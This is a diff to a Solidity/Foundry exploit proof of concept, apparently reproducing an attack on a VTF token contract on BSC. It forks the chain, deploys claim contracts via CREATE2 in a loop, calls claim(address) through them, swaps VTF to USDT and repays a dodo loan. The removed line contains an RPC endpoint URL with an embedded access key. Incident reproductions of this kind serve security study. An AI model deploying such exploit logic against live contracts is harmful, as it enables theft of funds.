@@ -48,7 +48,7 @@ contract ContractTest is DSTest{
 
     // ankr rpc bsc maybe unavailible, please use QuickNode
     function setUp() public {
-        cheat.createSelectFork("https://quaint-dark-tree.bsc.discover.quiknode.pro/5a0f7d015de8dbc92337c1a73711e6e34b44fe22/", 22535101);
+        cheat.createSelectFork("bsc", 22535101);
     }
 
     function testExploit() public{
@@ -76,13 +76,6 @@ contract ContractTest is DSTest{
         (bool success, ) = contractList[index].call(abi.encodeWithSignature("claim(address)", address(this)));
         require(success);
         VTFToUSDT();
-
-        emit log_named_decimal_uint(
-            "Attacker USDT balance in exploit",
-            USDT.balanceOf(address(this)),
-            18
-        );
-
         USDT.transfer(dodo, 100_000 * 1e18);
     }
 
@@ -117,7 +110,7 @@ contract ContractTest is DSTest{
     function contractFactory() public{
         address _add;
         bytes memory bytecode = type(claimReward).creationCode;
-        for(uint _salt = 0; _salt < 100; _salt++){
+        for(uint _salt = 0; _salt < 400; _salt++){
             assembly{
                 _add := create2(0, add(bytecode, 32), mload(bytecode), _salt)
             }
